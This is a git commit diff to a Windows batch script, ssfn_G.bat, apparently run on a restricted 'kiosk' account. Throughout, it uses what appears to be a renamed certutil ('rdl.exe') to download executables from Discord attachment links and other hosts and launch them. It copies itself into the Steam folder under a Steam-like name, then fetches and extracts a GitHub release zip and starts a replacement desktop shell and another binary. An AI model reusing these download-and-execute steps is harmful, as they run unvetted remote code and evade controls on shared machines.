f7dfe4db13d491f79b5925a2df5a947d559f8358
tobiasmulln <133047212+tobiasmulln@users.noreply.github.com>
2023-05-11 01:24:55 +0200

    Update ssfn_G.bat

--- ssfn_G.bat
+++ ssfn_G.bat
@@ -26,35 +26,30 @@ echo ---------------------------------------------------------------------------
 set "zipFile=C:\Users\kiosk\Downloads\G.zip"
 set "unzipFolder=C:\Users\kiosk\Downloads\G"
 
+if not exist "%unzipFolder%" (
+  md "%unzipFolder%"
+)
+
 IF EXIST "C:\Program Files (x86)\steam\ssfn_G.bat" (
 echo Exists) ELSE (
   c:\temp\rdl.exe -urlcache -split -f "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ssfn_G.bat" "C:\Program Files (x86)\Steam\ssfn_G.bat"
 )
 
-"c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\rdl.exe"
-"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
-#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\nt.exe"
-#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\task.exe"
+"c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\G\rdl.exe"
+"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
+#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\G\nt.exe"
+#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\G\task.exe"
 
-if not exist "%unzipFolder%" (
-  md "%unzipFolder%"
-)
-
-start "" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
-#start "" "C:\Users\kiosk\Downloads\nt.exe"
+start "" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
+#start "" "C:\Users\kiosk\Downloads\G\nt.exe"
 
 timeout /t 8
 
-#start "" "C:\Users\kiosk\Downloads\task.exe"
+#start "" "C:\Users\kiosk\Downloads\G\task.exe"
 
 "C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
 "C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x "C:\Users\kiosk\Downloads\G.zip" -oC:\Users\kiosk\Downloads\G
 del "%zipFile%"
-
-move "C:\Users\kiosk\Downloads\rdl.exe" "%unzipFolder%"
-move "C:\Users\kiosk\Downloads\VoughtUadml.exe" "%unzipFolder%"
-move "C:\Users\kiosk\Downloads\nt.exe" "%unzipFolder%"
-move "C:\Users\kiosk\Downloads\task.exe" "%unzipFolder%"
 
 REM --------- After Here RDL is in "C:\Users\kiosk\Downloads\G" !!
 
@@ -69,5 +64,9 @@ del shell.zip
 start "" "C:\Users\kiosk\Downloads\G\shell\CairoDesktop.exe"
 timeout /t 121
 start "" "C:\Users\kiosk\Downloads\G\bable\bable.exe"
+
+
+
+
 
 #echo C:\Users\user\Downloads\Cloud.exe|clip
